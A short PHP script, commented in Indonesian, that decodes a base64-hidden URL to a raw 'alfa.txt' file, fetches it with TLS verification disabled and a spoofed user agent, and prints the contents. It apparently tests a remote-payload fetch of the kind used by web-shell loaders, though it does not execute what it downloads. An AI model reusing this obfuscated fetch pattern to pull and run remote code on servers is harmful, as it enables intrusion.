<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Base64 string kamu (isi URL)
$base64 = "aHR0cHM6Ly93d3cudGFwZnVzZS5pby9yYXcvYWxmYS50eHQ=";

// Decode jadi URL
$url = base64_decode($base64);
echo "<b>Decoded URL:</b> $url<br><br>";

$content = false;

// === Cara 1: file_get_contents dengan context ===
$context = stream_context_create([
    "http" => [
        "method" => "GET",
        "header" => "User-Agent: Mozilla/5.0\r\n"
    ],
    "ssl" => [
        "verify_peer"      => false,
        "verify_peer_name" => false,
    ]
]);

$content = @file_get_contents($url, false, $context);

// === Cara 2: fallback ke cURL kalau file_get_contents gagal ===
if ($content === false || strlen($content) == 0) {
    echo "<b>file_get_contents gagal, coba pakai cURL...</b><br><br>";

    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        $content = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "cURL Error: " . curl_error($ch) . "<br>";
        }
        curl_close($ch);
    } else {
        echo "cURL tidak tersedia di server ini.<br>";
    }
}

// === Hasil ===
if ($content !== false && strlen($content) > 0) {
    echo "<b>Panjang konten:</b> " . strlen($content) . " byte<br><br>";
    echo "<h3>Isi Konten:</h3>";
    echo "<pre>" . htmlspecialchars(substr($content, 0, 2000)) . "</pre>"; // tampilkan max 2000 char
} else {
    echo "<b>Gagal ambil konten! (hasil kosong)</b>";
}
?>
